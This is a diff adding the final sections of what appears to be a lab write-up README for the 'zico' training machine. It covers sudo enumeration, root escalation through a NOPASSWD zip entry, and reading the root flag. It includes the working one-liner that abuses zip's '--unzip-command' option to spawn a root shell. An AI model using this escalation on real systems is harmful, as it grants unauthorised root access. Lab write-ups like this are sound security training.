@@ -307,4 +307,90 @@ This confirmed successful SSH authentication as the local user `zico`.
 
 ---
 
+
+## 17. Checking Sudo Permissions
+
+After logging in over SSH as `zico`, I checked which commands the account was allowed to run through `sudo`:
+
+```bash
+sudo -l
+```
+
+The output showed that `zico` could run two programs as root without being prompted for a password:
+
+```text
+(root) NOPASSWD: /bin/tar
+(root) NOPASSWD: /usr/bin/zip
+```
+
+This was an important privilege-escalation finding. The `NOPASSWD` setting means sudo does not require the user's password for the listed commands. In this case, both `tar` and `zip` were permitted to run with root privileges.
+
+![Screenshot 17: sudo permissions for zico](screenshots/last_17.png)
+
+## 18. Exploiting the Zip Permission to Obtain Root
+
+I used the permitted `zip` binary to obtain a root shell. First, I created an empty file to use as the input to the archive:
+
+```bash
+touch shell.php
+```
+
+Then I ran:
+
+```bash
+sudo -u root zip shell.zip shell.php -T --unzip-command="sh -c /bin/bash"
+```
+
+The command works because of the combination of the sudo permission and the options supported by `zip`:
+
+- `sudo -u root` runs the command as the root user.
+- `zip shell.zip shell.php` creates an archive named `shell.zip` containing `shell.php`.
+- `-T` tells `zip` to test the archive after creating it.
+- `--unzip-command="sh -c /bin/bash"` overrides the command that `zip` uses for that archive test. Instead of performing the usual test with an unzip program, it starts a shell command that launches `/bin/bash`.
+
+Because the permitted `zip` process was running as root, the shell launched by the test command also ran with root privileges. The resulting prompt changed to:
+
+```text
+root@zico:~#
+```
+
+That prompt confirmed that I had obtained a root shell.
+
+![Screenshot 18: root shell obtained through zip](screenshots/17.png)
+
+## 19. Reading the Root Flag
+
+With root access, I moved to the root user's home directory:
+
+```bash
+cd /root
+```
+
+I listed the available files and read `flag.txt`:
+
+```bash
+cat flag.txt
+```
+
+The file contained the following message:
+
+```text
+#
+#
+#
+# ROOOOT!
+# You did it! Congratz!
+#
+# Hope you enjoyed!
+#
+#
+#
+#
+```
+
+This confirmed completion of the machine: I had escalated from the `zico` account to root and successfully read the root flag.
+
+![Screenshot 19: reading flag.txt as root](screenshots/17.png)
+
+
 *AI assistance was used in preparing this README.*
